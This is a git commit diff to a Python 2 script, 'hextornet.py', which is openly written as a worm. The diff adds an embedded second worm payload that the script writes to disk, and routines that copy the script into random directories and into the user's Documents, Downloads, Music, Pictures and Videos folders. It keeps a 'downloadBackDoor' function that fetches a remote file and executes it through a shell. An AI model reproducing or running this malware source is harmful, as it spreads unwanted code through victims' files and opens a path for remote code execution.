0c18a5be925867f9a7c5edf041a6f14bee88c2a1
Hector Torres <hectormtc@live.com>
2018-09-24 20:46:00 +0000

    Update hextornet.py

--- hextornet.py
+++ hextornet.py
@@ -11,6 +11,7 @@ from urllib2 import urlopen
 import subprocess as sp
 import shutil
 import locale
+from random import randint
 
 
 print(
@@ -37,6 +38,7 @@ print(
 src = os.path.abspath("hextornet.py")
 usr = getpass.getuser()
 lang = locale.getdefaultlocale()
+directories = ""
 
 lang_es = ['Documentos', 'Descargas', 'Musica', 'Imagenes', 'Videos']
 lang_en = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
@@ -48,24 +50,73 @@ else:
 
 dst = ""
 
-def propagate():
+codigo = """
 
-	#Propagate worn in all directories
-	print("==========Worm location==========")
-	while len(directories) != 0:
-		for directory in directories:
-			if(os.path.isdir("/" + usr + "/" + directory + "/")):
-				dst = "/" + usr + "/" + directory + "/" + "hextornet.py"
-				print"dst:", dst
-			directories.remove(directory)
-        copyfile(src, dst)
-	run(dst) Run when use .exe 
-	print("=================================")
+#!/usr/bin/env python
 
-def copy():
+from shutil import copyfile
+import os, getpass
+from sys import argv
+#import win32con, win32api
+import os, random, sys, pkg_resources
+from urllib2 import urlopen
+import subprocess as sp
+import shutil
+import locale
+import random
+
+src = os.path.abspath("hexworm.py")
+usr = getpass.getuser()
+lang = locale.getdefaultlocale()
+dst = ""
+
+def copy(src):
 	script = sys.argv
 	name = str(script[0])
-	b = os.path.getsize(os.path.abspath("/root/Documents")) #Change in windows
+	b = os.path.getsize(os.path.abspath(src))
+	for i in range(0, 4):
+		directoryName = 'copy_' + str(random.randint(1000,9999))
+		try:
+			os.makedirs(directoryName, 0755)
+			print("File created: ",directoryName)
+			shutil.copy(name, directoryName)
+			src = os.path.abspath(directoryName)
+		except OSError as e:
+			os.chmod(src, 0755)
+
+def downloadBackDoor(url):
+	filename = url.split('/')[-1].split('#')[0].split('?')[0]
+	content = urlopen(url).read()
+        outfile = open(filename, "wb")
+        outfile.write(content)
+        outfile.close()
+        run(os.path.abspath(filename))
+	print "==========finish downloading=========="
+
+def run(program):
+	process = sp.Popen('python '+program, shell=True)
+	process.wait()
+
+def main():
+	#hide()
+	copy(src)
+	#downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")
+
+if __name__ == "__main__":
+	main()
+"""
+
+
+
+filename = open("hexworm.py", "w")
+filename.write(codigo)
+filename.close()
+
+
+def copy(src):
+	script = sys.argv
+	name = str(script[0])
+	b = os.path.getsize(os.path.abspath(src))
 	for i in range(0, 4):
 		directoryName = "files_" + str(i)
 		try:
@@ -73,7 +124,40 @@ def copy():
 			shutil.copy(name, directoryName)
 			src = os.path.abspath(directoryName)
 		except OSError as e:
-			os.chmod(directoryName, 0755)
+			os.chmod(src, 0755)
+
+def propagate():
+	global lang_es
+	global lang_en
+	global directories
+	print("==========Worm location==========")
+	while len(directories) != 0:
+		for directory in directories:
+			if(os.path.isdir("/" + usr + "/" + directory + "/")):
+				try:
+					dst = "/" + usr + "/" + directory + "/" + "hextornet.py"
+					copyfile(src, dst)
+					print'dst',dst
+				except:
+					print("Ya existe")
+			directories.remove(directory)
+	
+	if lang == ('en_US', 'UTF-8'):
+		directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
+	else:
+		directories = ['Documentos', 'Descargas', 'Musica', 'Imagenes', 'Videos']
+	
+	while len(directories) != 0:
+		for directory in directories:
+			if(os.path.isdir("/" + usr + "/" + directory + "/")):
+				try:
+					dst = "/" + usr + "/" + directory + "/" + "hexworm.py"
+					copyfile(src, dst)
+					print("WORM LOCATION:",dst)
+				except:
+					print("Ya existe")
+			directories.remove(directory)
+	print("=================================")
 
 #Use in windows
 """
@@ -91,6 +175,7 @@ def hide():
 			os.remove(fname)
 """
 
+
 def downloadBackDoor(url):
 	filename = url.split('/')[-1].split('#')[0].split('?')[0]
 	content = urlopen(url).read()
@@ -98,17 +183,18 @@ def downloadBackDoor(url):
         outfile.write(content)
         outfile.close()
         run(os.path.abspath(filename))
-	print "finish downloading"
+	print "==========finish downloading=========="
 
 def run(program):
 	process = sp.Popen('python '+program, shell=True)
-	#process.wait()
+	process.wait()
 
 def main():
-	#copy()
-	#hide()
+	copy(src)
 	propagate()
+	#hide()
 	#downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")
+
 
 if __name__ == "__main__":
 	main()
